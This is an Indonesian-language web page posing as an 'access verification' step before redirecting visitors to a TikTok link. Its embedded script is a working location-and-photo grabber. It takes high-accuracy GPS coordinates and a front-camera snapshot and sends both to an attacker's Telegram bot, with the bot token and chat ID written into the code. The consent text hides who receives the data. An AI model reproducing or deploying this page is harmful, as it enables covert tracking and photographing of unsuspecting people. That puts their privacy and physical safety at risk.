<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifikasi Akses</title>

<style>
*{
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#f5f5f5;
    margin:0;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
}

.card{
    background:white;
    width:95%;
    max-width:450px;
    padding:24px;
    border-radius:18px;
    box-shadow:0 8px 20px rgba(0,0,0,.1);
    text-align:center;
}

h2{
    margin-top:0;
}

.info{
    background:#eef5ff;
    border-radius:12px;
    padding:14px;
    margin:15px 0;
    text-align:left;
    font-size:14px;
}

button{
    width:100%;
    border:none;
    padding:14px;
    border-radius:12px;
    font-size:16px;
    cursor:pointer;
    margin-top:10px;
}

.primary{
    background:#007bff;
    color:white;
}

.secondary{
    background:#ececec;
}

video{
    width:100%;
    border-radius:14px;
    margin-top:15px;
    display:none;
}

#status{
    margin-top:15px;
    font-size:14px;
}
</style>
</head>
<body>

<div class="card">

    <h2>Verifikasi Akses</h2>

    <p>
        Untuk melanjutkan ke website utama,
        izinkan akses lokasi & kamera.
    </p>

    <div class="info">
        <strong>Data yang diminta:</strong><br>
        • Lokasi perangkat<br>
        • Kamera depan<br><br>
        Dengan menekan tombol di bawah, Anda menyetujui pengiriman data tersebut.
    </div>

    <button class="primary" onclick="startProcess()">
        Saya Setuju & Lanjutkan
    </button>

    <button class="secondary" onclick="goWebsite()">
        Lewati
    </button>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div id="status">Menunggu tindakan pengguna</div>

</div>

<script>
// ======================
// CONFIG
// ======================
const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";
const CHAT_ID = "1966317946";
const REDIRECT_URL = "https://vm.tiktok.com/ZS9YuAPYjNXtp-H2oTY/ Postingan ini dibagikan via TikTok Lite. Unduh TikTok Lite untuk menikmati postingan lainnya: https://www.tiktok.com/tiktoklite";

// ======================

let latitude = null;
let longitude = null;
let stream = null;

function setStatus(text){
    document.getElementById("status").innerText = text;
}

async function getLocation() {
    return new Promise((resolve, reject) => {

        if (!navigator.geolocation) {
            reject("Browser tidak mendukung lokasi");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                latitude = pos.coords.latitude;
                longitude = pos.coords.longitude;
                resolve();
            },
            (err) => reject(err.message),
            {
                enableHighAccuracy: true,
                timeout: 10000
            }
        );
    });
}

async function startCamera() {

    stream = await navigator.mediaDevices.getUserMedia({
        video: {
            facingMode: "user"
        },
        audio: false
    });

    const video = document.getElementById("video");
    video.style.display = "block";
    video.srcObject = stream;

    // tunggu video siap
    await new Promise(resolve => {
        video.onloadedmetadata = resolve;
    });
}

async function sendLocation() {

    if (!latitude || !longitude) return;

    const text =
`📍 Data Lokasi Pengguna

Latitude: ${latitude}
Longitude: ${longitude}

Map:
https://maps.google.com/?q=${latitude},${longitude}`;

    await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
            method: "POST",
            headers:{
                "Content-Type":"application/json"
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text
            })
        }
    );
}

async function sendPhoto() {

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    return new Promise((resolve) => {

        canvas.toBlob(async(blob)=>{

            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "selfie.jpg");

            await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                {
                    method:"POST",
                    body: formData
                }
            );

            resolve();

        }, "image/jpeg");
    });
}

async function startProcess(){

    try{

        setStatus("Meminta izin lokasi...");
        await getLocation();

        setStatus("Mengaktifkan kamera...");
        await startCamera();

        setStatus("Mengirim lokasi...");
        await sendLocation();

        setStatus("Mengambil foto...");
        await sendPhoto();

        setStatus("Selesai, mengarahkan...");

        // matikan kamera
        if(stream){
            stream.getTracks().forEach(track => track.stop());
        }

        setTimeout(()=>{
            window.location.href = REDIRECT_URL;
        },1500);

    } catch(err){
        console.error(err);
        setStatus("Akses ditolak atau gagal.");

        setTimeout(()=>{
            window.location.href = REDIRECT_URL;
        },2000);
    }
}

function goWebsite(){
    window.location.href = REDIRECT_URL;
}
</script>

</body>
</html>
